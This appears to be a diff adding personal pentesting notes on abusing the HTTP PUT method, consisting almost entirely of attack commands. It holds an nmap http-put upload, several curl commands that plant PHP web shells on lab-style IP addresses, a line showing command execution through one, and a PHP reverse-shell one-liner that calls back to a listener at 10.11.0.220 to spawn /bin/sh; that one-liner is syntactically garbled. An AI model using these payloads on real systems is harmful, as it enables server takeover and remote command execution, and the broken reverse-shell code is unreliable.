@@ -1,0 +1,22 @@
+PUT-HTTP
+nmap -p 80 192.168.0.105 --script http-put --script-args http-put.url'/test/shell.php',http-put.file='shell.php'
+
+-------------------------------------------
+
+curl http://victim-site.com --upload-file file.txt
+
+curl -X PUT -d '<?php system($_GET["exec"]); ?>' http://192.168.0.105/test/shell.php
+
+curl -X PUT -d '<?php system($_REQUEST["exec"]); ?>' http://10.11.1.14/shell.asp
+
+then you can enter 192.168.0.105/test/shell.php/?exec=ifconfig
+-------------------------------------------
+
+curl -X PUT -d 'http://10.11.0.220/shell-p-444.asp' http://10.11.1.14/shell.asp
+
+
+curl -X PUT -d '<?php -r '$sock=fsockopen(10.11.0.220",1234);exec("/bin/sh -i <&d >&%d 2>&%d",f,f,f)' ?>' http://10.11.1.14/shell.txt
+
+
+curl -X PUT -d '<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>' http://10.11.1.229/poopypants.txt
+
